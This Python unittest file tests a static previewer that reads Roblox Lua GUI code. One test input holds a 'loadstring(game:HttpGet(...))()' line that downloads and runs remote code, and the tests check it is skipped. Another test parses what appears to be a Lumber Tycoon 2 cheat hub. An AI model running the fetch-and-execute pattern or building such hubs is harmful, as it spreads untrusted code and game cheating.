import unittest
from pathlib import Path
from lua_preview import build_preview, EXAMPLE_SOURCE


class PreviewTests(unittest.TestCase):
    def test_instance_properties_parent_and_values(self):
        plan = build_preview(EXAMPLE_SOURCE)
        self.assertFalse(plan.error)
        frame = next(e for e in plan.elements if e.kind == 'Frame')
        button = next(e for e in plan.elements if e.kind == 'TextButton')
        self.assertIs(button.parent, frame)
        self.assertEqual(frame.props['Size'], (0, 440, 0, 300))
        self.assertEqual(frame.props['AnchorPoint'], (0.5, 0.5))
        self.assertEqual(button.props['BackgroundColor3'], '#9b73f5')
        self.assertEqual(button.props['Text'], 'Get started')

    def test_wrappers_tables_and_reassignment(self):
        plan = build_preview('''local theme = {Accent = Color3.fromRGB(100, 50, 200)}
local gui = new("ScreenGui", {})
local f = new("Frame", {Size = UDim2.fromOffset(300, 200), BackgroundColor3 = theme.Accent}, gui)
local title = Label(f, {Text = "hello" .. " world", Position = UDim2.new(0, -10, 0, 5)})
title.Text = "changed"
round(f, 12)
''')
        self.assertFalse(plan.error)
        label = next(e for e in plan.elements if e.kind == 'TextLabel')
        self.assertEqual(label.props['Text'], 'changed')
        self.assertEqual(label.props['Position'], (0, -10, 0, 5))
        self.assertEqual(label.parent.props['BackgroundColor3'], '#6432c8')
        self.assertEqual(label.parent.props['CornerRadius'], 12)

    def test_callbacks_functions_and_remote_code_are_not_previewed(self):
        plan = build_preview('''local gui = Instance.new("ScreenGui")
local button = Instance.new("TextButton", gui)
button.Text = "Visible"
button.MouseButton1Click:Connect(function()
  Instance.new("Frame", gui)
  writefile("should-not-exist", "x")
end)
local function buildHidden() Instance.new("Frame", gui) end
loadstring(game:HttpGet("https://example.invalid/code"))()
for i=1,100 do Instance.new("Frame",gui) end
''')
        self.assertFalse(plan.error)
        self.assertEqual([e.kind for e in plan.elements], ['ScreenGui', 'TextButton'])
        self.assertTrue(any('omitted' in note for note in plan.notes))

    def test_real_lt2_pages_and_control_ownership(self):
        plan = build_preview(Path('Lt2.txt').read_text())
        self.assertFalse(plan.error)
        pages = [e for e in plan.elements if e.kind == 'HubPage']
        self.assertEqual([p.props['Text'] for p in pages], ['Wood','Logs','Plot','Shop','Tools','Vehicle','World','Protection'])
        toggle = next(e for e in plan.elements if e.props.get('Text') == 'Bring Logs To Me After Each Tree')
        self.assertEqual(toggle.kind, 'HubToggle')
        self.assertEqual(toggle.parent.props['Text'], 'Auto Chop')
        self.assertIs(toggle.parent.parent, pages[0])

    def test_invalid_source_and_unresolved_properties(self):
        plan = build_preview('local f = Instance.new("Frame")\nf.Size = getSizeFromGame()\nlocal broken = )')
        self.assertTrue(any('partial' in note for note in plan.notes))
        self.assertTrue(any('runtime values' in note for note in plan.notes))
        self.assertFalse(plan.error)


if __name__ == '__main__':
    unittest.main()
